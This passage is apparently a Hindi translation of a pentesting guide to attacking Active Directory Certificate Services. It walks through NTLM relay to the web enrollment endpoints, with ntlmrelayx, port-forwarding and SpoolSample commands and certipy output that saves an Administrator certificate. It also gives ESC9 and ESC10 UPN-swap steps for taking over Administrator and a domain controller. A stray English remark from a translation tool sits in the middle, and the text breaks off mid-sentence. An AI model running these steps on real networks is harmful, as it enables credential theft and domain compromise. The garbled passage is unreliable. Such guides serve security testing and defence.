AD CS कई **HTTP-आधारित नामांकन विधियों** का समर्थन करता है जिन्हें प्रशासक अतिरिक्त AD CS सर्वर भूमिकाओं के रूप में स्थापित कर सकते हैं। ये HTTP-आधारित प्रमाणपत्र नामांकन इंटरफेस सभी **NTLM रिले हमलों के लिए संवेदनशील** हैं। NTLM रिले का उपयोग करते हुए, एक हमलावर एक **समझौता किए गए मशीन पर किसी भी इनबाउंड-NTLM-प्रमाणीकरण AD खाते का अनुकरण कर सकता है**। पीड़ित खाते का अनुकरण करते समय, एक हमलावर इन वेब इंटरफेसों तक पहुँच सकता है और **`User` या `Machine` प्रमाणपत्र टेम्पलेटों के आधार पर एक ग्राहक प्रमाणीकरण प्रमाणपत्र का अनुरोध कर सकता है**।

* **वेब नामांकन इंटरफेस** (एक पुराने दिखने वाला ASP एप्लिकेशन जो `http://<caserver>/certsrv/` पर सुलभ है), डिफ़ॉल्ट रूप से केवल HTTP का समर्थन करता है, जो NTLM रिले हमलों के खिलाफ सुरक्षा नहीं कर सकता। इसके अलावा, यह स्पष्ट रूप से केवल NTLM प्रमाणीकरण की अनुमति देता है अपने Authorization HTTP हेडर के माध्यम से, इसलिए अधिक सुरक्षित प्रोटोकॉल जैसे कि Kerberos उपयोग नहीं किए जा सकते।
* **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) वेब सेवा, और **Network Device Enrollment Service** (NDES) डिफ़ॉल्ट रूप से उनके Authorization HTTP हेडर के माध्यम से बातचीत प्रमाणीकरण का समर्थन करते हैं। बातचीत प्रमाणीकरण **Kerberos और NTLM का समर्थन करता है**; नतीजतन, एक हमलावर रिले हमलों के दौरान NTLM प्रमाणीकरण तक **बातचीत को कम कर सकता है**। ये वेब सेवाएँ कम से कम HTTPS को डिफ़ॉल्ट रूप से सक्षम करती हैं, लेकिन दुर्भाग्य से HTTPS अकेले NTLM रिले हमलों के खिलाफ सुरक्षा नहीं करता। केवल जब HTTPS को चैनल बाइंडिंग के साथ जोड़ा जाता है, तब ही HTTPS सेवाएँ NTLM रिले हमलों से सुरक्षित हो सकती हैं। दुर्भाग्य से, AD CS IIS पर प्रमाणीकरण के लिए विस्तारित सुरक्षा को सक्षम नहीं करता है, जो चैनल बाइंडिंग को सक्षम करने के लिए आवश्यक है।

NTLM रिले हमलों के साथ सामान्य **समस्याएं** यह हैं कि **NTLM सत्र आमतौर पर छोटे होते हैं** और हमलावर **NTLM हस्ताक्षर को लागू करने वाली सेवाओं के साथ बातचीत नहीं** कर सकता।

हालांकि, NTLM रिले हमले का दुरुपयोग करके उपयोगकर्ता के लिए एक प्रमाणपत्र प्राप्त करना इस सीमाओं को हल करता है, क्योंकि सत्र तब तक जीवित रहेगा जब तक प्रमाणपत्र मान्य है और प्रमाणपत्र का उपयोग **NTLM हस्ताक्षर को लागू करने वाली सेवाओं का उपयोग करने के लिए किया जा सकता है**। चुराए गए प्रमाणपत्र का उपयोग कैसे करें, इसके लिए देखें:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

NTLM रिले हमलों की एक और सीमा यह है कि उन्हें **हमलावर-नियंत्रित मशीन पर पीड़ित खाते के प्रमाणीकरण की आवश्यकता होती है**। एक हमलावर प्रतीक्षा कर सकता है या **बल** का प्रयास कर सकता है:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **दुरुपयोग**

\*\*\*\*[**Certify**](https://github.com/GhostPack/Certify) का `cas` कमांड **सक्षम HTTP AD CS अंतरापृष्ठों** का परिगणन कर सकता है:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

Enterprise CAs अपने AD ऑब्जेक्ट में `msPKI-Enrollment-Servers` प्रॉपर्टी में **CES एंडपॉइंट्स को स्टोर करते हैं**। **Certutil.exe** और **PSPKI** इन एंडपॉइंट्स को पार्स करके लिस्ट कर सकते हैं:
```
certutil.exe -enrollmentServerURL -config CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA
```
Since there is no English text provided outside of the markdown and HTML syntax, there is nothing to translate. The content you've provided is an image tag and caption tag with no text. If you provide English text, I can translate it into Hindi for you.
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
#### Certify के साथ दुरुपयोग
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy) के साथ दुरुपयोग

डिफ़ॉल्ट रूप से, Certipy `Machine` या `User` टेम्प्लेट के आधार पर एक प्रमाणपत्र का अनुरोध करेगा, यह निर्भर करता है कि क्या रिलेयेड अकाउंट नाम `$` से समाप्त होता है। `-template` पैरामीटर के साथ एक अन्य टेम्प्लेट को निर्दिष्ट करना संभव है।

हम फिर [PetitPotam](https://github.com/ly4k/PetitPotam) जैसी तकनीक का उपयोग करके प्रमाणीकरण को मजबूर कर सकते हैं। डोमेन कंट्रोलर्स के लिए, हमें `-template DomainController` निर्दिष्ट करना चाहिए।
```
$ certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## सुरक्षा एक्सटेंशन नहीं - ESC9 <a href="#5485" id="5485"></a>

### व्याख्या

ESC9 **`msPKI-Enrollment-Flag`** मान **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) को संदर्भित करता है। यदि यह फ्लैग किसी प्रमाणपत्र टेम्पलेट पर सेट होता है, तो **नया `szOID_NTDS_CA_SECURITY_EXT` सुरक्षा एक्सटेंशन** एम्बेड नहीं किया जाएगा। ESC9 केवल तब उपयोगी होता है जब `StrongCertificateBindingEnforcement` को `1` (डिफ़ॉल्ट) पर सेट किया गया हो, क्योंकि Kerberos या Schannel के लिए कमजोर प्रमाणपत्र मैपिंग कॉन्फ़िगरेशन का दुरुपयोग ESC10 के बिना भी किया जा सकता है — ESC9 के बिना — क्योंकि आवश्यकताएँ समान होंगी।

* `StrongCertificateBindingEnforcement` को `2` (डिफ़ॉल्ट: `1`) पर सेट नहीं किया गया है या `CertificateMappingMethods` में `UPN` फ्लैग शामिल है
* प्रमाणपत्र में `msPKI-Enrollment-Flag` मान में `CT_FLAG_NO_SECURITY_EXTENSION` फ्लैग होता है
* प्रमाणपत्र किसी भी क्लाइंट प्रमाणीकरण EKU को निर्दिष्ट करता है
* किसी भी खाता A पर `GenericWrite` का उपयोग करके किसी भी खाता B को समझौता करना

### दुरुपयोग

इस मामले में, `John@corp.local` के पास `Jane@corp.local` पर `GenericWrite` है, और हम `Administrator@corp.local` को समझौता करना चाहते हैं। `Jane@corp.local` को प्रमाणपत्र टेम्पलेट `ESC9` में नामांकन की अनुमति है जो `msPKI-Enrollment-Flag` मान में `CT_FLAG_NO_SECURITY_EXTENSION` फ्लैग को निर्दिष्ट करता है।

पहले, हम `Jane` का हैश प्राप्त करते हैं, उदाहरण के लिए Shadow Credentials का उपयोग करके (हमारे `GenericWrite` का उपयोग करके)।

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (22).png" alt=""><figcaption></figcaption></figure>

अगला, हम `Jane` का `userPrincipalName` `Administrator` होने के लिए बदलते हैं। ध्यान दें कि हम `@corp.local` भाग को छोड़ रहे हैं।

<figure><img src="../../../.gitbook/assets/image (2) (2) (3).png" alt=""><figcaption></figcaption></figure>

यह एक संयम उल्लंघन नहीं है, क्योंकि `Administrator` उपयोगकर्ता का `userPrincipalName` `Administrator@corp.local` है न कि `Administrator`।

अब, हम असुरक्षित प्रमाणपत्र टेम्पलेट `ESC9` का अनुरोध करते हैं। हमें प्रमाणपत्र का अनुरोध `Jane` के रूप में करना होगा।

<figure><img src="../../../.gitbook/assets/image (16) (2).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि प्रमाणपत्र में `userPrincipalName` `Administrator` है और जारी किए गए प्रमाणपत्र में कोई "ऑब्जेक्ट SID" नहीं है।

फिर, हम `Jane` का `userPrincipalName` कुछ और होने के लिए वापस बदलते हैं, जैसे कि उसका मूल `userPrincipalName` `Jane@corp.local`।

<figure><img src="../../../.gitbook/assets/image (24) (2).png" alt=""><figcaption></figcaption></figure>

अब, यदि हम प्रमाणपत्र के साथ प्रमाणीकरण करने का प्रयास करते हैं, तो हमें `Administrator@corp.local` उपयोगकर्ता का NT हैश प्राप्त होगा। आपको अपनी कमांड लाइन में `-domain <domain>` जोड़ने की आवश्यकता होगी क्योंकि प्रमाणपत्र में कोई डोमेन निर्दिष्ट नहीं है।

<figure><img src="../../../.gitbook/assets/image (3) (1) (3).png" alt=""><figcaption></figcaption></figure>

## कमजोर प्रमाणपत्र मैपिंग्स - ESC10

### व्याख्या

ESC10 डोमेन कंट्रोलर पर दो रजिस्ट्री कुंजी मानों को संदर्भित करता है।

`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` `CertificateMappingMethods`। डिफ़ॉल्ट मान `0x18` (`0x8 | 0x10`), पहले `0x1F`।

`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` `StrongCertificateBindingEnforcement`। डिफ़ॉल्ट मान `1`, पहले `0`।

**मामला 1**

`StrongCertificateBindingEnforcement` को `0` पर सेट किया गया

**मामला 2**

`CertificateMappingMethods` में `UPN` बिट (`0x4`) शामिल है

### दुरुपयोग मामला 1

* `StrongCertificateBindingEnforcement` को `0` पर सेट किया गया
* किसी भी खाता A पर `GenericWrite` का उपयोग करके किसी भी खाता B को समझौता करना

इस मामले में, `John@corp.local` के पास `Jane@corp.local` पर `GenericWrite` है, और हम `Administrator@corp.local` को समझौता करना चाहते हैं। दुरुपयोग के चरण लगभग ESC9 के समान हैं, सिवाय इसके कि किसी भी प्रमाणपत्र टेम्पलेट का उपयोग किया जा सकता है।

पहले, हम `Jane` का हैश प्राप्त करते हैं, उदाहरण के लिए Shadow Credentials का उपयोग करके (हमारे `GenericWrite` का उपयोग करके)।

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (19).png" alt=""><figcaption></figcaption></figure>

अगला, हम `Jane` का `userPrincipalName` `Administrator` होने के लिए बदलते हैं। ध्यान दें कि हम `@corp.local` भाग को छोड़ रहे हैं।

<figure><img src="../../../.gitbook/assets/image (5) (3).png" alt=""><figcaption></figcaption></figure>

यह एक संयम उल्लंघन नहीं है, क्योंकि `Administrator` उपयोगकर्ता का `userPrincipalName` `Administrator@corp.local` है न कि `Administrator`।

अब, हम किसी भी प्रमाणपत्र का अनुरोध करते हैं जो क्लाइंट प्रमाणीकरण की अनुमति देता है, उदाहरण के लिए डिफ़ॉल्ट `User` टेम्पलेट। हमें प्रमाणपत्र का अनुरोध `Jane` के रूप में करना होगा।

<figure><img src="../../../.gitbook/assets/image (14) (2) (1).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि प्रमाणपत्र में `userPrincipalName` `Administrator` है।

फिर, हम `Jane` का `userPrincipalName` कुछ और होने के लिए वापस बदलते हैं, जैसे कि उसका मूल `userPrincipalName` `Jane@corp.local`।

<figure><img src="../../../.gitbook/assets/image (4) (1) (3).png" alt=""><figcaption></figcaption></figure>

अब, यदि हम प्रमाणपत्र के साथ प्रमाणीकरण करने का प्रयास करते हैं, तो हमें `Administrator@corp.local` उपयोगकर्ता का NT हैश प्राप्त होगा। आपको अपनी कमांड लाइन में `-domain <domain>` जोड़ने की आवश्यकता होगी क्योंकि प्रमाणपत्र में कोई डोमेन निर्दिष्ट नहीं है।

<figure><img src="../../../.gitbook/assets/image (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

### दुरुपयोग मामला 2

* `CertificateMappingMethods` में `UPN` बिट फ्लैग (`0x4`) शामिल है
* किसी भी खाता A पर `GenericWrite` का उपयोग करके किसी भी खाता B को समझौता करना जिसमें `userPrincipalName` गुण नहीं है (मशीन खाते और बिल्ट-इन डोमेन प्रशासक `Administrator`)

इस मामले में, `John@corp.local` के पास `Jane@corp.local` पर `GenericWrite` है, और हम डोमेन कंट्रोलर `DC$@corp.local` को समझौता करना चाहते हैं।

पहले, हम `Jane` का हैश प्राप्त करते हैं, उदाहरण के लिए Shadow Credentials का उपयोग करके (हमारे `GenericWrite` का उपयोग करके)।

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10).png" alt=""><figcaption></figcaption></figure>

अगला, हम `Jane` का `userPrincipalName` `DC$@corp.local` होने के लिए बदलते हैं।

<figure><img src="../../../.gitbook/assets/image (18) (2) (1).png" alt=""><figcaption></figcaption></figure>

यह एक संयम उल्लंघन नहीं है, क्योंकि `DC$` कंप्यूटर खाते में `userPrincipalName` नहीं है।

अब, हम किसी भी प्रमाणपत्र का अनुरोध करते हैं जो क्लाइंट प्रमाणीकरण की अनुमति देता है, उदाहरण के लिए डिफ़ॉल्ट `User`
